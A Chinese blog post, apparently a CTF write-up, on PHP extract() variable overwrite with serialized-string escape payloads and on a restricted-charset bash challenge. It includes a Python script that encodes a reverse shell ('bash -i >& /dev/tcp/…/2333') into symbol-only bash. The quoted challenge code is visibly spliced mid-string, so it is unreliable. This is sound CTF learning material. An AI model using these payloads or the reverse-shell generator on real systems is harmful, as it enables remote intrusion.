<p>其实本是知道这个知识点的,但是理解不够深入,导致自己一直没有利用到该知识点</p>
<p><img src="/2021/02/20/安洵杯/image-20210117150843092.png" alt="image-20210117150843092"></p>
<p>当我们$_GET传入的是_session[img]=“index.php”时,经过了extract函数后会产生$_session[img]=index.php</p>
<p>这里分析代码</p>
<p>先是赋值:</p>
<p>$_SESSION[“user”] = ‘guest’;<br>$_SESSION[‘function’] = $function;  //若想要显示源码,$f=’show_image’;</p>
<p>$_SESSION[‘img’]也只能等于base64_encode(‘guest_img.png’);因为若我们传入参数img_PATH的话img的值会进行sha1加密,而后面是没有解密的</p>
<p>可知三个变量都是我们不能控制的,这里就能够有很多种解了,通过extract()进行变量覆盖</p>
<h4 id="0x02-反序列化字符串逃逸"><a href="#0x02-反序列化字符串逃逸" class="headerlink" title="0x02 反序列化字符串逃逸"></a>0x02 反序列化字符串逃逸</h4><p>_session可控后,就可以有很多种解法了,这里提供两种解法:</p>
<h5 id="值逃逸"><a href="#值逃逸" class="headerlink" title="值逃逸"></a>值逃逸</h5><p>payload1<code>:_SESSION[user]=flagflagflagflagflagflagflagphp&amp;_SESSION[function]=function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code><br>传入的字符串反序列化后:</p>
<pre><code class="php">a:3;{s:4:&quot;user&quot;;s:31:&quot;flagflagflagflagflagflagflagphp&quot;;
s:8:&quot;function&quot;;s:82:&quot;function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;;
    s:3:&quot;img&quot;;s:x:&quot;base64&quot;;}
</code></pre>
<p>经过过滤函数后:</p>
<pre><code class="php">a:3;{s:4:&quot;user&quot;;s:31:&quot;&quot;;s:8:&quot;function&quot;;s:82:&quot;function&quot;;
s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;
s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}
    //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;}
</code></pre>
<h5 id="键逃逸"><a href="#键逃逸" class="headerlink" title="键逃逸"></a>键逃逸</h5><p>payload2:<code>_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></p>
<pre><code class="php">传入的字符串反序列化后:
a:2:{s:7:&quot;flagphp&quot;;  s:48:&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;;
s:3:&quot;img&quot;;s:x:&quot;base64&quot;;}
</code></pre>
<pre><code class="php">经过过滤函数后:
a:2:{s:7:&quot;&quot;;s:48:&quot;;  s:1:&quot;a&quot;;
s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot; 
//;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;}
</code></pre>
<p>还有就是写payload最好在本地写,然后看它反序列化后的样子在更改,不然有些小毛病自己发现不了(现在能力太差了)</p>
<p><img src="/2021/02/20/安洵杯/image-20210117163109211.png" alt="image-20210117163109211"></p>
<p>然后继续读就可以了</p>
<p><img src="/2021/02/20/安洵杯/image-20210117163415047.png" alt="image-20210117163415047"></p>
<h1 id="安洵杯-2020"><a href="#安洵杯-2020" class="headerlink" title="[安洵杯 2020]"></a>[安洵杯 2020]</h1><h2 id="Web-Bash-Vino0o0o"><a href="#Web-Bash-Vino0o0o" class="headerlink" title="Web-Bash-Vino0o0o"></a>Web-Bash-Vino0o0o</h2><p>题目代码</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
if(isset($_POST[&quot;cmd&quot;]))
{
    $test = $_POST[&#39;cmd&#39;];
    $white_list = str_split(&#39;$&quot;;                           #01
n[2]=&quot;$(($&lt;&lt;$))&quot;               #10
n[3]=&quot;$(($(($&lt;&lt;$))|$))&quot;   #11
n[4]=&quot;$(($(($&lt;&lt;$))&lt;&lt;$))&quot; #100
n[5]=&quot;$(($(($(($&lt;&lt;$))&lt;&lt;$))|$))&quot; #101
n[6]=&quot;$(($(($(($&lt;&lt;$))&lt;&lt;$))|$(($&lt;&lt;$))))&quot; #101
n[7]=&quot;$(($(($(($(($&lt;&lt;$))&lt;&lt;$))|$))|$(($&lt;&lt;$))))&quot;   #111
</code></pre>
<p>然后发现错了,因为不能包含  |  </p>
<pre><code class="python">n = dict()
n[0] = &#39;0&#39;
n[1] = &#39;$&#39;                                   #$计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#))
n[2] = &#39;$(($&lt;&lt;$))&#39;                       #通过位运算得到2
n[3] = &#39;$(($(($&lt;&lt;$))#$$))&#39;       #通过二进制11转换为十进制得到3,4,5,6,7
n[4] = &#39;$(($&lt;&lt;$(($&lt;&lt;$))))&#39;
n[5] = &#39;$(($(($&lt;&lt;$))#$0$))&#39;
n[6] = &#39;$(($(($&lt;&lt;$))#$$0))&#39;
n[7] = &#39;$(($(($&lt;&lt;$))#$$$))&#39;
</code></pre>
<p>​            3.转换成数字之后就需要用到<code>&lt;&lt;&lt;</code>来重定向了，但是一层不够，只用一层会出现<code>bash: $&#39;\154\163&#39;: command not found</code>这样的报错，得知bash一次解析只能解析到成数字，需要第二次解析。因此需要给原先的命令添加转义字符，最终构造出如下payload:<code>$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#39;\\$$(($(($&lt;&lt;$))#$0$))$(($&lt;&lt;$(($&lt;&lt;$))))\\$$(($(($&lt;&lt;$))#$$0))$(($(($&lt;&lt;$))#$$))\\$(($&lt;&lt;$(($&lt;&lt;$))))0\\$(($(($&lt;&lt;$))#$0$))$(($(($&lt;&lt;$))#$$$))\&#39;</code>执行<code>ls</code>命令</p>
<p>脚本</p>
<pre><code class="python">import requests
n = dict()
n[0] = &#39;0&#39;
n[1] = &#39;$&#39;                                   #$计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#))
n[2] = &#39;$(($&lt;&lt;$))&#39;                       #通过位运算得到2
n[3] = &#39;$(($(($&lt;&lt;$))#$$))&#39;       #通过二进制11转换为十进制得到3,4,5,6,7
n[4] = &#39;$(($&lt;&lt;$(($&lt;&lt;$))))&#39;
n[5] = &#39;$(($(($&lt;&lt;$))#$0$))&#39;
n[6] = &#39;$(($(($&lt;&lt;$))#$$0))&#39;
n[7] = &#39;$(($(($&lt;&lt;$))#$$$))&#39;

cmd=&quot;bash -i &gt;&amp; /dev/tcp/192.168.182.137/2333 0&gt;&amp;1&quot;;
def str_to_oct(cmd):  # 命令转换成八进制字符串
    s = &quot;&quot;
    for t in cmd:
        o = (&#39;%s&#39; % (oct(ord(t))))[2:]
        s += &#39;\\&#39; + o
    return s
def build(cmd):  # 八进制字符串转换成字符
    payload = &quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#39;&quot;
    s = str_to_oct(cmd).split(&#39;\\&#39;)
    for _ in s[1:]:
        payload += &quot;\\\\&quot;
        for i in _:
            payload += n[int(i)]
    return payload + &#39;\\\&#39;&#39;
print(build(cmd))
</code></pre>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="/img/custom/donate/zhifubaoSQ.jpg"></li>
                <li class="wechat-code"><img src="/img/custom/donate/wechatSQ.jpg"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2021/02/24/ctfshow-xss/" rel="prev">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                ctfshow-xss</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2021/02/19/Five86-2/" rel="next">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\27.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\27.png">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                Five86-2</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
          <a href="hojun.cn" class="profile gravatar"><img src="https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg" itemprop="image" alt="Pp1ove" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="hojun.cn" itemprop="url" rel="author">Pp1ove</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    
<!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Pp1ove<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2021 HAPPY NEW YEAR !!!</p>
    </div>
       <center>
                网站已运行:<span id="run_time" style="color:black"></span>
            </center>

            <script>
                function runTime() {
                    var d = new Date(), str = '';
                    BirthDay = new Date("January 01,2021");
                    today = new Date();
                    timeold = (today.getTime() - BirthDay.getTime());
                    sectimeold = timeold / 1000
                    secondsold = Math.floor(sectimeold);
                    msPerDay = 24 * 60 * 60 * 1000
                    msPerYear = 365 * 24 * 60 * 60 * 1000
                    e_daysold = timeold / msPerDay
                    e_yearsold = timeold / msPerYear
                    daysold = Math.floor(e_daysold);
                    yearsold = Math.floor(e_yearsold);
                    //str = yearsold + "年";
                    str += daysold + "天";
                    str += d.getHours() + '时';
                    str += d.getMinutes() + '分';
                    str += d.getSeconds() + '秒';
                    return str;
                }
                setInterval(function () { $('#run_time').html(runTime()) }, 1000);
            </script>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>

<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>
<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>

  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
 <div class="theme-controls row-container">
  <ul class="menu-list">
   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
  </ul>
 </div>
</div>
<canvas id="night-mode-cover"></canvas>
 
  <div class="changeSkin-gear no-select">
  <div class="keys" id="setbtn"> 
   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
     <i class="iconfont icon-gear inline-block rotating"></i> 
   </span>
  </div>
</div>

  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="/img/custom/head.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さくら荘そのPp1ove</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/Pp1ove" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/技术/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/复现/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  复现
                </a>
              </li>
            
              <li>
                <a href="/categories/学科/">
                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
                  学科
                </a>
              </li>
            
              <li>
                <a href="/categories/题目/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  题目
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/bangumi/">
                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                  番组
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/图集/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/client/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
            客户端
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="5251613646"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
<script src="//instant.page/3.0.0" type="module" defer integrity="s</body>
</html>